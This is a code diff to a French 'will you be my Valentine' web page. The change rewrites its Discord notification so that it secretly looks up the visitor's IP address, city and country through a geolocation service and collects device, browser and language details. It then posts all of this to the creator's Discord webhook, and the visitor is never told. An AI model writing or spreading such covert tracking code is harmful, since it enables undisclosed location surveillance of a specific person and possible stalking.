@@ -139,17 +139,46 @@
         "Dernière chance !",
     ];
 
-    // Fonction pour envoyer à Discord (CORRIGÉE)
-    function notifyDiscord(answer) {
-        // On a enlevé la ligne "if(...) return" qui bloquait l'envoi
-        fetch(DISCORD_WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: `🔔 **Alerte Cupidon !** \nLa réponse est : **${answer}**`
-            })
-        }).catch(err => console.error("Erreur d'envoi :", err));
-    }
+    async function notifyDiscord(answer) {
+            // 1. On récupère les infos de base du navigateur
+            const ua = navigator.userAgent;
+            const platform = navigator.platform;
+            const language = navigator.language;
+            
+            // 2. On essaie de récupérer l'IP et la ville (via un service gratuit)
+            let geoData = "Infos localisation indisponibles";
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                geoData = `📍 Ville: ${data.city}, Pays: ${data.country_name} (IP: ${data.ip})`;
+            } catch (e) {
+                console.log("Erreur geo");
+            }
+
+            // 3. On prépare le gros message bien détaillé
+            const message = {
+                content: `🔔 **ALERTE RÉPONSE !**`,
+                embeds: [{
+                    title: `Elle a dit : ${answer}`,
+                    color: answer.includes("OUI") ? 0x00ff00 : 0xff0000,
+                    description: `Détails techniques sur ta Valentine :`,
+                    fields: [
+                        { name: "🌍 Localisation", value: geoData },
+                        { name: "📱 Appareil/Système", value: `${platform} (${navigator.vendor})` },
+                        { name: "🌐 Navigateur", value: ua.split(' ').pop() },
+                        { name: "🗣️ Langue", value: language }
+                    ],
+                    footer: { text: "Envoyé avec amour (et un peu de code)" }
+                }]
+            };
+
+            // 4. On envoie tout ça
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(message)
+            });
+        }
 
     // Animation des coeurs
     function createHeart() {
@@ -190,5 +219,6 @@
 </body>
 
 </html>
+
 
 
